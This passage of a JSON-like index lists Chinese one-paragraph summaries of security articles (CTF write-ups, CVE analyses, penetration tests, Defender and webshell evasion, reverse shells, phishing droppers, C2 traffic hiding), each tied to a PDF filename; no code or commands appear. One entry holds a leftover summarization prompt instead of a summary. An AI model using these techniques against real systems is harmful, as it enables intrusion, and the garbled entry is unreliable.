        "page_content": "该文档介绍了如何利用 Hessian 4.0.38 和 JDK8u342 中的漏洞，通过构造畸形的序列化数据，触发 toString() 方法，绕过 JavaUtils.writeBytesToFilename 限制，最终使用 System.load 执行动态链接库，实现远程代码执行。",
        "FileName": "11732-0ctf2022 hessian-only-jdk writeup jdk原生链.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，其中利用了目标网站的漏洞，包括反序列化漏洞、PHP 短标签问题和 UAF 漏洞，最终通过上传 exploit 获得了 shell 权限。",
        "FileName": "9830-记一次简单的渗透.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用酒店房间自助售货机的支付漏洞，通过修改返回数据包中的折扣参数，可以获得购买折扣，甚至免费获得商品。该漏洞的挖掘过程涉及抓包分析、修改数据包和测试，重点关注流程中每个参数的含义和作用。",
        "FileName": "8369-对酒店房间自助售货机的支付漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2019-10758 漏洞，该漏洞存在于 mongo-express 中，允许攻击者通过未授权的请求执行任意命令。漏洞利用了 toBSON 函数中的 VM 沙箱逃逸，以及对 mongo 传值时 bson 处理中的问题。文档还讨论了绕过认证机制的方法，并提供了官方修复信息。",
        "FileName": "7056-CVE-2019-10758mongo-expressRCE复现分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种使用主流 CDN（如 Cloudflare 和腾讯云）实现流量封装的工具，该工具通过将 C2 通信伪装成合法通信（如与 CDN 的 TLS 流量）来隐藏 C2 流量。它提供了使用 Go 语言标准库的 Websocket 来实现流量封装工具的代码示例，并解释了如何使用该工具在 Linux 上或作为独立程序来代理 C2 通信。",
        "FileName": "8687-一款使用主流CDN实现流量封装的工具.pdf"
    },
    {
        "page_content": "该文档主要介绍了 musl libc 的基本数据结构、源码分析、比赛总结和利用 dequeue 的两种流程。musl libc 通过 chunk、group 和 meta 管理堆内存，并使用 meta_area 管理 meta。malloc 函数通过从 active 队列中获取 meta 或从队列中其他 group 中找到没被释放的 chunk 来分配内存，而 free 函数则通过设置 freed_mask 和调用 nontrivial_free 来释放内存。利用 dequeue 可以通过构造假的 meta 或覆盖 group 中指向 meta 的指针来实现任意地址指针互写，从而劫持程序执行流。",
        "FileName": "10326-musl 1.2.2 总结+源码分析 One.pdf"
    },
    {
        "page_content": "该文档记录了 Ahmed Hesham 对 50 多个 Hack The Box 环境的渗透测试过程，详细介绍了渗透流程、知识点和思考，涵盖了 Nmap 扫描、Web 枚举、SQL 注入、Linux 提权等技术，为渗透测试人员提供了宝贵的学习资源。",
        "FileName": "7188-《0xrick's Write-ups for hack-the-box》学习备忘录（1）.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 phpweb 前台任意文件上传漏洞，该漏洞存在于 base/appplus.php 文件中，但需要绕过第 15 行的密钥校验。通过全局搜索，发现 base/post.php 文件中存在泄露 md5(strrev($dbUser.$dbPass)) 值的代码，当 $act=\"appcode\" 时，该值可被输出。攻击者可利用此漏洞先泄露密钥值，再利用 base/appplus.php 上传文件。",
        "FileName": "7053-phpweb前台任意文件上传.pdf"
    },
    {
        "page_content": "该文档介绍了在不出网主机的情况下，通过 SMB Beacon、HTTP 代理和 Pystinger 搭建内网隧道的方法。它详细描述了使用 SMB Beacon 横向移动、配置 HTTP 代理、使用 Pystinger 搭建 Socks4 代理的步骤，并提供了连接过程的示意图。该方法允许攻击者在不出网主机上建立与 C2 服务器的连接，从而实现远程控制和数据传输。",
        "FileName": "8671-不出网主机上线方法.pdf"
    },
    {
        "page_content": "该文档主题是“分析如下文档并完成以下任务”，内容包括：\n1. 分析文档的主题和内容\n2. 用一段话概括文档",
        "FileName": "9423-Internal System wp2021hfctf.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 Windows 系统中通过远程线程注入 DLL，包括获取进程句柄、申请空间、写入 DLL 路径、加载 DLL、获取 ZwCreateThreadEx 函数地址、创建远程线程等步骤，并讨论了突破 session 0 注入和提权的方法。",
        "FileName": "12577-Dll注入.pdf"
    },
    {
        "page_content": "本文档分析了 2020Geekpwn-Qemu 逃逸 -Vimu 解题过程，详细介绍了题目的主题、内容、解题思路和过程，包括分析漏洞点、利用方法和代码实现。",
        "FileName": "8017-2020Geekpwn-Qemu逃逸-Vimu解题过程分析.pdf"
    },
    {
        "page_content": "该文档介绍了侧信道攻击的概念，并通过四道题的分析讲解了侧信道攻击在 XSS 攻击中的应用。侧信道攻击是一种利用侧信息（Side Channel）来获取系统信息或绕过安全机制的攻击方式，在 XSS 攻击中，侧信道攻击可以用来绕过 XSS Auditor 等安全机制，获取数据并外带 flag。文档中通过分析 35C3 CTF filemanager、Chrome 中存在的一个特性 XSS Auditor 和 chrome-error、XCTF 2019 Final noxss 等题目的解题思路，详细阐述了侧信道攻击在 XSS 攻击中的原理和应用。",
        "FileName": "9288-从三道题学习xss侧信道.pdf"
    },
    {
        "page_content": "该文档详细介绍了在 Vulnstack 红队学习环境中对 Windows 7 和 Windows Server 2008 R2 域控进行渗透测试的步骤，包括网络配置、弱口令攻击、提权、横向移动、域控拿下和远程连接等技术。",
        "FileName": "9368-vulnstack红队一学习.pdf"
    },
    {
        "page_content": "该文档分析了 CmsEasy CMS 中的两个漏洞：SQL 注入和任意文件写入。SQL 注入漏洞允许攻击者通过上传包含恶意 SQL 语句的文件来执行任意 SQL 查询，而任意文件写入漏洞允许攻击者通过 POST 请求向服务器写入恶意 PHP 文件，从而获得对系统的控制。",
        "FileName": "10452-CmsEasy代码审计-PHP.pdf"
    },
    {
        "page_content": "**主题：** 通过反序列化漏洞利用 JDBC 后门实现远程代码执行\n\n**内容：** 该文档介绍了一种通过反序列化漏洞利用 JDBC 后门实现远程代码执行的技术。它利用了 DriverManager 类中的 SPI 机制，通过动态添加远程 jar 包到运行程序的 classpath 中，在进行 JDBC 连接时触发恶意逻辑，从而实现远程代码执行。文档详细介绍了实现过程，包括反序列化漏洞利用、恶意 jar 包构造、远程 jar 包加载和 JDBC 连接触发漏洞等步骤。",
        "FileName": "11837-通过反序列化利用JDBC后门.pdf"
    },
    {
        "page_content": "该文档详细介绍了 SQLi_Labs 靶场中 Basic Challenges 的解题方法，涵盖了从 Less-1 到 Less-22 的各个挑战，涉及 SQL 注入的各种技术，包括报错注入、盲注、时间盲注、布尔盲注、文件导出、Header 头注入、Cookie 注入等。",
        "FileName": "12056-SQLi_Labs靶场之Basic Challenges学习分享.pdf"
    },
    {
        "page_content": "本文档探讨了绕过 Microsoft Defender 的几种方法，包括修改字符串、混淆代码、使用自制 C# 加载器、通过 NetLoader 传递有效负载以及使用 SharpPack 绕过 AMSI。作者成功地绕过了 Defender，并运行了恶意 C# 可执行文件和 PowerShell 脚本，而无需将任何内容写入磁盘。",
        "FileName": "9620-如何使用几个简单步骤绕过Defender.pdf"
    },
    {
        "page_content": "该文档介绍了一种使用 HTTP 隧道和 Burp-Non-HTTP-Extension 插件拦截非 HTTP TCP 数据包的方法，以进行安全分析。该方法涉及使用 Squid 建立 HTTP 代理，使用 Burp-Non-HTTP-Extension 拦截数据，并使用 Proxifier 建立 HTTP 隧道将 TCP 流量转发到代理。该方法允许分析人员拦截和修改非 HTTP 数据包，从而增强对应用程序的安全性评估。",
        "FileName": "8640-如何利用http tunnel使用burpsuite拦截某个app的tcp数据包（非http）做安全分析.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Flink 中的 CVE-2020-17518 漏洞，该漏洞允许攻击者通过 REST API 将任意文件写入 Flink 的本地文件系统，影响版本为 1.5.1 至 1.11.2，修复方法是升级到 1.11.3 或 1.12.0。",
        "FileName": "8995-漏洞分析 - Apache Flink 任意文件写入漏洞(CVE-2020-17518).pdf"
    },
    {
        "page_content": "Apache Solr 是一款开源的搜索服务器，它基于 Lucene 构建，提供全文本检索、索引和相关性计算等功能。Solr 的核心组件包括：文档、字段、字段分析、模式、分析器、标记器和过滤器。Solr 使用 HTTP 请求处理外部数据，并通过请求处理程序定义如何处理请求。Solr 的配置信息存储在 solrconfig.xml 和 schema.xml 文件中，其中 solrconfig.xml 影响 Solr 本身参数最多的配置文件。",
        "FileName": "9321-Apache Solr 组件安全概览.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用无回显 RCE 漏洞在目标系统上获取命令执行权限，并通过在线 DNSLog 平台或自建 VPS 接收命令回显，最终实现 Getshell。",
        "FileName": "8436-【实战】无回显Rce到Getshell.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Microsoft SQL Server 中的模拟登录权限来提升权限。通过授予用户模拟其他用户的能力，攻击者可以绕过权限限制并获得对高权限用户的访问权限。该文档提供了详细的步骤，说明如何创建模拟登录、查找可以模拟登录的用户以及模拟登录以获取 sysadmin 权限。",
        "FileName": "8195-利用mssql模拟登录提权.pdf"
    },
    {
        "page_content": "该文档揭示了一种新型窃密软件，伪装成 CDR 画图应用程序安装包，通过释放恶意文件并加载 DLL，持续窃取用户信息，包括主机信息、进程列表、登录用户和网络配置，并将其发送给攻击者的服务器。",
        "FileName": "11653-揭开新型窃密软件的面纱：伪装成CDR画图应用安装包.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 afl+preeny 对交互式应用程序进行 fuzz 测试。它首先介绍了 fuzz 测试的基本原理，然后详细介绍了如何使用 afl-clang-fast 编译 wget 源代码，如何使用 LD_PRELOAD 预加载 preeny 项⽬，以及如何使用 nc 架起 nc，让其返回特定的 response 包。最后，它展示了如何使用 gdb 调试找到程序卡住的位置，并修改源码，强制断开连接，退出程序。",
        "FileName": "7643-afl+preeny实现对交互应用的fuzz.pdf"
    },
    {
        "page_content": "本文档详细介绍了对金微手机商城 V0.3.7 版本进行代码审计的过程，重点关注了 SQL 注入、文件上传和任意文件删除等漏洞，并提供了绕过这些漏洞的有效方法，展示了代码审计中发现和利用漏洞的技巧。",
        "FileName": "9114-记一次新手入门级别的代码审计.pdf"
    },
    {
        "page_content": "Python 的序列化和反序列化是将一个类对象向字节流转化从⽽进⾏存储和传输，然后使⽤的时候，再将字节流转化回原始的对象的过程。反序列化时，如果类对象中存在属性为 __setstate__，则会调⽤该⽅法，否则会调⽤ __dict__ ⽅法。",
        "FileName": "12367-浅析python反序列化.pdf"
    },
    {
        "page_content": "**主题：**极致 CMSv1.7 漏洞分析\n\n**内容：**本文分析了极致 CMSv1.7 中的多个漏洞，包括 MVC 中的 SQL 注入、XSS 注入和任意文件删除漏洞，并提供了利用这些漏洞的详细步骤和示例代码。",
        "FileName": "9416-记一次详细的代码审计.pdf"
    },
    {
        "page_content": "该文档介绍了 Linux 进程伪装技术，包括动态修改 `/proc/self/exe` 链接，以隐藏进程的真实可执行文件。它提供了使用 `setproctitle`、`execve`、`execveat` 和 `prctl` 系统调用修改进程 ID 和可执行文件路径的代码示例。",
        "FileName": "10235-Linux进程伪装：动态修改procselfexe.pdf"
    },
    {
        "page_content": "WebLogic-XMLDecoder 反序列化漏洞分析，该漏洞允许攻击者通过 XMLDecoder 反序列化恶意 XML 文档来执行任意代码。漏洞影响 WebLogic 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1 和 12.2.1.2 版本。CVE-2017-3506 补丁禁用了 object 标签，而 CVE-2017-10271 绕过了该补丁，通过 void 标签构造类。CVE-2019-2725 漏洞存在于 _async 组件中，可以通过构造函数执行任意代码。CVE-2019-2727 漏洞绕过了 CVE-2017-10271 补丁，通过 array 标签代替 class 标签构造类。",
        "FileName": "8465-WebLogic-XMLDecoder反序列化漏洞分析.pdf"
    },
    {
        "page_content": "本文档介绍了 OpenSCA 技术原理中基于 composer 包管理器的组件成分解析原理。composer 是 PHP 的依赖管理工具，其依赖管理文件 composer.json 和 composer.lock 记录了项目使用的直接和间接依赖以及组件间的依赖关系。解析算法优先解析 composer.lock 文件，如果没有则解析 composer.json 文件，通过模拟 composer 构建流程获取项目引用的组件依赖，并层级解析获取整个项目的依赖信息。",
        "FileName": "12098-技术文档  OpenSCA技术原理之composer依赖解析.pdf"
    },
    {
        "page_content": "该文档详细介绍了 GitHub 企业版 RCE 漏洞，该漏洞允许攻击者在 GitHub 企业版服务器上注入恶意参数，从而覆盖任意文件并执行任意命令。虽然该漏洞需要攻击者具有访问存储库的权限，但研究人员无法找到利用该漏洞的方法。GitHub 已确认该漏洞并发布了修复程序，并向研究人员颁发了 20,000 美元的赏金。",
        "FileName": "8458-GitHub企业版RCE漏洞 (GitHub Enterprise  2.21.4) 2020.8.pdf"
    },
    {
        "page_content": "该文档分析了 Java 安全中 commons-collections4 包下的两条反序列化链，CC2 和 CC4。这些链利用了 LazyMap 和 TreeBag 类中的漏洞，允许攻击者通过精心构造的序列化数据执行任意命令。文档提供了利用这些链的示例代码，并解释了攻击是如何工作的。",
        "FileName": "12143-Java安全中commons-collections4包下的两条反序列化链.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-0796 漏洞，该漏洞影响 Microsoft Server Message Block 3.1.1 协议，允许未经身份验证的攻击者在目标 SMB 服务器或客户端上执行代码。文档提供了漏洞的详细信息、影响范围、检测方法、修复措施和分析，并附上了相关的参考资料。",
        "FileName": "7440-smbghost（CVE-2020-0796）漏洞POC汇总及简单分析.pdf"
    },
    {
        "page_content": "该文档介绍了信息收集技术，包括域名信息收集、ICP 备案查询、子域名挖掘、CMS 指纹识别、探测工具、端口收集、端口攻击、防御措施、Google hack、Github 信息泄露、CDN 绕过、真实 IP 地址收集和验证。",
        "FileName": "7715-信息收集.pdf"
    },
    {
        "page_content": "该文档重点介绍了代码审计中常见的漏洞，包括 XSS 漏洞、文件上传漏洞和 SQL 注入漏洞。它提供了详细的示例和代码分析，说明如何识别和利用这些漏洞。",
        "FileName": "10094-代码审计--最常见的漏洞审计篇.pdf"
    },
    {
        "page_content": "House of pig 是一种利用多手法联合 IO 的方法，它通过 largebin attack 和 io_file 结构体利用与 tcache stashing unlink attack 结合利用，主要适用于程序中仅有 calloc 函数而没有 malloc 函数利用的情况。",
        "FileName": "12916-多手法联合IO利用之House of pig 学习利用.pdf"
    },
    {
        "page_content": "该文档介绍了两种免杀技术：动态写入文件和 WebSocket。动态写入文件通过在虚拟机中创建临时 JSP 文件来绕过检测，而 WebSocket 使用反射远程执行命令，允许通过在线工具进行任意连接。",
        "FileName": "12772-Jsp两种研究后的免杀.pdf"
    },
    {
        "page_content": "该文档介绍了一个名为 Fastjson-Gadgets-Automatic-Scanner 的工具，该工具利用抽象语法树挖掘 Fastjson 中可用的 Gadget，特别是 JNDI 注入 Gadget。该工具通过对 jar 包进行反编译、语法树分析和类声明筛选，识别出潜在的 Gadget，并提供初步检测结果。",
        "FileName": "11001-利用抽象语法树挖掘Fastjson可用的Gadget.pdf"
    },
    {
        "page_content": "本文介绍了一种绕过 JavaScript 加密进行爆破的方法，该方法利用 Python 的 pyppeteer 模块模拟浏览器输入明文密码，再使用 mitmproxy 模块截取流量，提取出 JavaScript 加密后的内容，从而生成密文字典进行爆破。",
        "FileName": "8576-采集器绕过js加密爆破.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Unicode 码和 PHP 语言特性来构造无字母数字的 Webshell，包括使用 `[].Φ` 获取字符串 `Array`、使用 Unicode 码遍历字母表、缩短和压榨代码长度等技巧。此外，文档还提供了使用异或运算和动态特性执行任意代码的方法，但指出这种方法的符号熵较大，在实战中应谨慎使用。",
        "FileName": "7742-无字母数字webshell进阶收藏版.pdf"
    },
    {
        "page_content": "该文档分析了 BEEScms 代码审计漏洞，包括后台文件上传漏洞、后台 SQL 注入漏洞和任意用户登录漏洞。通过修改数据包中的 content-type 字段，可以绕过文件上传校验，上传 webshell。通过 GET 方式获取可控参数 id，没有经过任何过滤，造成了 SQL 注入漏洞。通过覆盖 session 表示位，可以将后台文件上传变为前台文件上传。",
        "FileName": "10480-BEEScms代码审计漏洞分析.pdf"
    },
    {
        "page_content": "该文档记录了一次对客户端进行安全测试的经历，测试人员首先尝试通过抓包分析客户端流量，但发现数据被加密。随后，他们转向目标服务器，通过端口扫描发现开放的端口，并成功登录 WebSphere 管理控制台。然而，在尝试上传 WAR 包时遇到了错误，经过多次尝试和调整，最终通过使用 Myeclipse 生成的 WAR 文件成功上传并启动应用程序。",
        "FileName": "10253-记一次对某客户端的安全测试.pdf"
    },
    {
        "page_content": "本文档详细介绍了如何利用某安全厂商产品中的0day通用逻辑缺陷漏洞，通过目录遍历漏洞获取敏感信息，并利用IIS中间件的CVE-1999-0278漏洞获取ASP源代码，最终发现一个逻辑缺陷漏洞，即无论用户名是否存在，只要输入密码\"dandain12345\"即可登录，从而成功获取管理员权限并上传一句话木马。",
        "FileName": "9925-某安全厂商产品0day通用逻辑缺陷漏洞到Getshell全过程.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，其中利用了 SQL 注入、WAF 绕过、越权、目录穿越和免杀绕过等技术，最终成功获取了目标网站的 shell 权限。测试人员强调了细心和思考的重要性，并指出即使是简单的技术点，组合在一起也能产生强大的效果。",
        "FileName": "10081-记一次小组合拳测试.pdf"
    },
    {
        "page_content": "该文档介绍了渗透测试中的一些常规技巧，包括在目标不出网的情况下通过冰蝎代理和Proxifier快速代理、利用远控软件读取配置文件远程连接、通过文件分割和certutil.exe下载大文件、利用泄露的驱动绕过杀毒软件、添加伪签名或利用泄露的证书避免扫描工具被杀等。",
        "FileName": "12346-渗透测试中一些常规技巧的分享.pdf"
    },
    {
        "page_content": "本文总结了作者参加某地级市网络攻防演练红队渗透的经验和教训，包括未授权访问、SQL Server xp_cmdshell 提权、Procdump+mimikatz 配合抓取密码、CobaltStrike 从内存加载 .NET 程序集、CobaltStrike 与 Metasploit 之间的会话传递等知识点，并提出了两个待解决的问题和对红队渗透的探索与想法。",
        "FileName": "11300-记首次HW某地级市攻防演练红队渗透总结.pdf"
    },
    {
        "page_content": "该文档提供了红队信息收集的详细指南，涵盖了企业信息、IP 信息、Web 信息和用户级别的收集方法，并推荐了用于自动化和简化流程的工具。",
        "FileName": "10236-红队篇之信息收集.pdf"
    },
    {
        "page_content": "该文档详细介绍了对某收费协同办公系统的审计过程，发现了多个漏洞，包括任意文件删除、SQL注入、任意文件下载和密码重置SQL注入，并提供了漏洞原理和审计思路，强调了该系统开发中的安全问题。",
        "FileName": "9438-记一次对某收费协同办公系统的审计(.Net审计).pdf"
    },
    {
        "page_content": "**主题：** 若依 RCE 黑名单绕过分析\n\n**内容：** 文档分析了若依 RCE 黑名单的多种绕过方法，包括利用文件协议、单引号绕过、LDAPS 绕过、配置文件 RCE 和命令执行。它还讨论了不同版本若依中的黑名单限制和绕过策略，并提供了相应的 POC。",
        "FileName": "10957-某依rce黑名单多种bypass方法分析.pdf"
    },
    {
        "page_content": "本文档重点介绍了内网信息收集，包括主机信息、网络配置、软件信息、服务信息、查毒软件、开3389端口、计划任务、用户列表、端口信息、补丁信息、防火墙、域信息、ICMP探测、ARP探测、TCP/UDP协议、端口信息收集、查询域信息、查询域主机、查询域用户、查找域控、查询域管理员、获取域SID信息、查询当前权限以及推荐的渗透测试工具。",
        "FileName": "8291-浅析内网信息收集.pdf"
    },
    {
        "page_content": "该文档讨论了三种常见的 Web 应用程序漏洞：不安全的文档下载、目录遍历和敏感信息泄露。这些漏洞都是由于对用户输入的验证不足造成的，攻击者可以利用这些漏洞访问或下载未经授权的文件、遍历目录结构或泄露敏感信息。",
        "FileName": "12010-Pikachu靶场-合集.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 SSRF 攻击 Zookeeper 来控制 Dubbo 消费者，从而实现远程代码执行。攻击者通过修改 Zookeeper 中注册的 Dubbo 提供者地址，将消费者连接到恶意 Dubbo 提供者，并利用 Java 反序列化漏洞执行任意代码。",
        "FileName": "9627-XCTF2021-Final-Dubbo WriteUp SSRF - Dubbo Consumer RCE.pdf"
    },
    {
        "page_content": "该文档记录了对一个菠菜网站的渗透测试过程，包括发现弱口令、SQL注入漏洞、上线MSF、提权、远程登录服务器和利用hash远程登录管理员账号等步骤，展示了渗透测试中常见的技术和方法。",
        "FileName": "12501-某菠菜的测试笔记.pdf"
    },
    {
        "page_content": "该文档讨论了使用 AFL 测试网络服务程序的技巧，重点介绍了一种基于辅助程序的解决方案，该解决方案允许在不修改 AFL 或目标程序的情况下进行测试。该解决方案通过辅助程序启动目标程序并通过网络发送输入，从而避免了在每次测试中重新启动程序的需要，并允许在目标程序失去响应时自动记录崩溃输入。",
        "FileName": "8680-一种基于AFL测试网络服务程序的小技巧.pdf"
    },
    {
        "page_content": "本文档探讨了如何将代码审计转化为 CTF 挑战，重点关注 GitHub 上的代码审计。它以 iCMS 为例，展示了如何通过分析历史漏洞和修复补丁来识别代码中的潜在漏洞。该文档强调了开发人员在修复漏洞时可能遇到的困难，并建议初学者专注于反复出现漏洞的代码区域。它还讨论了常见的 SSRF 绕过技术，并展示了如何利用 PHP 和 libcurl 之间的解析差异来绕过过滤措施。",
        "FileName": "7256-如何将代码审计变成CTF---面向github代码审计.pdf"
    },
    {
        "page_content": "本文探讨了在程序内部获取自身加载的 DLL 基地址的方法，重点介绍了基于 PEB 的搜索方法。该方法通过遍历 PEB 中的链表，定位到 Kernel32.dll 的加载基地址，具有较高的准确性和兼容性。",
        "FileName": "10478-x32 PEB 获取Kernel32基地址的原理及实现.pdf"
    },
    {
        "page_content": "本文探讨了未授权和越权访问漏洞，重点关注基于 Web 的未授权访问漏洞。未授权访问漏洞是指绕过登录限制访问受保护功能，而越权访问漏洞是指使用较低权限执行高权限操作。本文提供了挖掘此类漏洞的方法，包括修改认证因子（如 Cookie）和分析代码层面的权限检查。最后，本文强调了修复此类漏洞的重要性，建议在每个操作前检查登录状态和用户权限。",
        "FileName": "11500-未授权、越权类漏洞探究.pdf"
    },
    {
        "page_content": "该文档分析了 PbootCMS2.07 内核中一个前台任意文件包含漏洞，该漏洞是由模板解析函数中对路径过滤不严格导致的。攻击者可以通过双写绕过过滤，控制 parser 函数的参数，从而包含任意文件。漏洞验证成功，并提供了修复方案。",
        "FileName": "7744-代码审计：PbootCMS2.07内核处理缺陷导致的一个前台任意文件包含漏洞分析.pdf"
    },
    {
        "page_content": "本文探讨了 Webshell 免杀技术，重点针对 D 盾、安全狗和护卫神等安全软件。它介绍了静态检查、动态检测和日志检查等主流查杀方法，并提供了使用灵活的语言特性、重构代码和加密解密等免杀技巧。本文还展示了使用可变变量、数组、回调函数和 Create_function 等 PHP 函数进行免杀的具体示例。",
        "FileName": "7151-Webshell免杀研究.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在渗透测试中使用两种不同方法获取 Web 服务器 shell 的经历。第一种方法利用 SQLMap 的 OS-Shell 功能直接获取 shell，而第二种方法利用 SQL 注入获取管理员账户密码，然后通过后台图片上传和 IIS7.5 解析漏洞获取 shell。",
        "FileName": "8162-记一次不同思路的getshell经历.pdf"
    },
    {
        "page_content": "该文档分析了 smbms Java 项目中的多个 XSS 漏洞，包括 Referer 处 XSS、getParameter() 获取的参数 XSS、存储型 XSS 和长度绕过 XSS。文档还介绍了如何通过跟踪 getParameter() 关键词来发现存储型 XSS 漏洞，以及如何利用 JavaScript 中的 AJAX 功能实现任意密码修改。",
        "FileName": "12226-java代码审计之smbms.pdf"
    },
    {
        "page_content": "该文档讨论了密码找回中的常见套路，包括利用 HTTP Host Header 欺骗、X-Forwarded-Host 欺骗、验证链接批量发送和手机号码中的 SQL 注入。这些套路允许攻击者重置任意用户的密码，从而威胁账户安全。",
        "FileName": "7977-密码找回中的套路.pdf"
    },
    {
        "page_content": "该文档详细描述了作者对一个棋牌后台进行渗透测试的过程，包括信息收集、SQL注入、CS上线、提权、凭证访问和进一步信息收集。作者成功获取了系统权限，并发现了后台管理员账号密码，揭示了该棋牌系统存在安全漏洞，并呼吁警惕网络诈骗。",
        "FileName": "10471-棋牌站人人得而诛之.pdf"
    },
    {
        "page_content": "本文档主要介绍了 LLVM PASS PWN 的调试方法，并以 CISCN 2021 SATool 为例，详细分析了漏洞利用过程。通过逆向分析和调试，作者发现漏洞发生在 SAPass.so 中的 runOnFunction 函数中，并利用 fakekey 函数修改了 *heap_ptr 的值，最终执行了 one_gadget，获得了 shell 权限。",
        "FileName": "11768-LLVM PASS PWN (二).pdf"
    },
    {
        "page_content": "该文档主要介绍了后渗透和内网初体验，包括绕过 disable_functions、隐藏攻击 IP、反弹 shell、升级 shell、权限维持、内网信息收集、搭建代理、清理痕迹等内容。",
        "FileName": "11459-后渗透及内网初体验的总结.pdf"
    },
    {
        "page_content": "本文档介绍了一个常规的免杀钓鱼流程，该流程涉及使用 bypassAV 和 GoFileBinder 工具来生成免杀的恶意可执行文件，该文件伪装成 PDF 文档，当用户点击该文件时，受害主机将上线到 C2 服务器。该流程旨在提高人们对攻击者如何使用伪装进行钓鱼的认识，并提供防御此类攻击的建议。",
        "FileName": "11885-记一个常规的免杀钓鱼流程.pdf"
    },
    {
        "page_content": "该文档详细介绍了 JRMPListener 模块的攻击流程，包括生成 payload、发送 payload 触发反序列化、利用 Reflections 工具构造对象、创建 ActivationGroupImpl 对象、设置端口值、导出对象并开启端口监听。攻击者通过发送 payload 给服务器，服务器反序列化后会开启一个端口监听，从而完成攻击。",
        "FileName": "10036-payloadsJRMPListener.pdf"
    },
    {
        "page_content": "**主题：** Car Rental Management System 中的 SQL 注入和未授权文件上传漏洞\n\n**内容：** 该文档详细描述了 Car Rental Management System 中存在的两个漏洞：未授权文件上传和 SQL 注入。未授权文件上传漏洞允许攻击者上传恶意文件，而 SQL 注入漏洞允许攻击者通过修改 SQL 查询来访问或修改数据库中的数据。文档提供了漏洞复现步骤和源代码位置，以帮助安全研究人员和开发人员了解和修复这些漏洞。",
        "FileName": "8542-Car Rental Management System待审记录.pdf"
    },
    {
        "page_content": "本文档详细介绍了反弹 shell 的概念和方法，包括正向连接和反向连接。它提供了使用 netcat、Bash、curl、crontab、profile、socat、telnet、python、php、perl、ruby 和 Metasploit 框架生成反弹 shell 一句话的具体步骤。此外，还讨论了使用 OpenSSL 反弹加密 shell 的方法，以避免流量被窃听。",
        "FileName": "9488-反弹Shell，看这一篇就够了.pdf"
    },
    {
        "page_content": "该文档详细描述了对一个内网环境的渗透过程，包括端口扫描、信息收集、漏洞利用、提权、横向移动和最终获取域控权限。渗透者通过一系列技术手段，如端口扫描、信息收集、漏洞利用、提权和横向移动，逐步攻破了目标网络，最终获得了域控权限，并获取了四个 flag。",
        "FileName": "10293-记一次内网流量转发学习.pdf"
    },
    {
        "page_content": "本文介绍了红队攻击中花式钓鱼竿钓鱼的技巧，包括如何隐藏钓鱼钩、选择钓鱼网站、处理木马、建立钓鱼感知系统以及选择钓鱼水域。作者分享了基于邮箱的钓鱼策略，并强调了针对性发送、可信邮箱和漏洞补丁伪造的重要性。文章还提供了实战效果和总结，并提供了参考链接。",
        "FileName": "7958-红队攻防系列之花式鱼竿钓鱼篇.pdf"
    },
    {
        "page_content": "该文档描述了一个黑客发现了一个 C# 程序反序列化漏洞，该漏洞允许攻击者通过发送经过特殊设计的序列化数据来执行任意代码。黑客通过分析程序代码，猜测服务器端存在反序列化操作，并使用 Ysoserial.NET 工具生成恶意数据，成功在目标服务器上执行命令并获取 shell 权限。",
        "FileName": "10262-记一个黑盒挖到的C#程序反序列化漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用大数据框架 Hue 的默认配置中的安全漏洞来执行命令和反弹 shell。它详细描述了上传恶意脚本、提交计划任务并执行任务的过程，并强调了更改认证方式和屏蔽默认端口等防范措施。",
        "FileName": "9472-大数据框架Hue命令执行技巧.pdf"
    },
    {
        "page_content": "**主题：** phpMyAdmin PMASA-2020-1 SQL 注入漏洞分析与复现\n\n**内容：** phpMyAdmin PMASA-2020-1 漏洞是一个 SQL 注入漏洞，允许攻击者在用户帐户页面中注入自定义 SQL，从而绕过身份验证并访问 MySQL 服务器。该漏洞要求攻击者拥有有效的 MySQL 帐户，并且可以通过构造一个简单的 POC 来利用，该 POC 会触发 SQL 语法错误并泄露 MySQL 版本信息。",
        "FileName": "7092-phpmyadmin PMASA-2020-1 漏洞分析与复现.pdf"
    },
    {
        "page_content": "该文档主要介绍了marshalsec改造篇，加入dubbo-hessian2 exploit，分析了marshalsec的主题和内容，并对hessian payload原理进行了浅析。",
        "FileName": "7235-marshalsec改造篇-加入dubbo-hessian2 exploit.pdf"
    },
    {
        "page_content": "本文档介绍了从头到尾执行模糊测试的完整工作流程，重点介绍了 AFL 框架。它提供了有关如何选择合适的软件、创建有效的测试用例、启动模糊测试以及分析结果的指导。该文档还强调了最小化测试用例、分类崩溃和确定代码覆盖率的重要性，以提高模糊测试的效率和有效性。",
        "FileName": "7191-从开始到结束的fuzz(AFL).pdf"
    },
    {
        "page_content": "本文探讨了利用 Web 应用程序防火墙 (WAF) 进行拒绝服务攻击的方法。WAF 旨在保护 Web 应用程序免受恶意流量的侵害，但通过利用其检测顺序问题，攻击者可以修改静态资源链接以包含恶意有效负载，从而触发 WAF 规则并导致正常用户 IP 被封禁。这种攻击方式不需要大量肉鸡，不会影响目标服务运行，但会阻止用户访问服务。",
        "FileName": "7895-利用WAF进行拒绝服务攻击.pdf"
    },
    {
        "page_content": "CVE-2021-4034 漏洞利用 pkexec 程序中的越界读取漏洞，通过设置恶意环境变量 GCONV_PATH，利用 iconv 函数加载恶意 so 文件，最终获取 root 权限。该漏洞影响 2021 年之前的发行版，修复方法包括更新到最新版本、取消 pkexec 的 suid 权限等。",
        "FileName": "10905-CVE-2021-4034 pkexec再深入分析.pdf"
    },
    {
        "page_content": "本文介绍了一种通过利用网站的技术支持信息来获取漏洞信息的渗透测试方法。通过搜索具有相同应用的网站，可以获取有用的漏洞信息，例如默认密码规则、日志和备份规则以及加密密钥。如果条件允许，还可以下载源码进行代码审计。",
        "FileName": "8347-让渗透从黑盒变为“灰盒”.pdf"
    },
    {
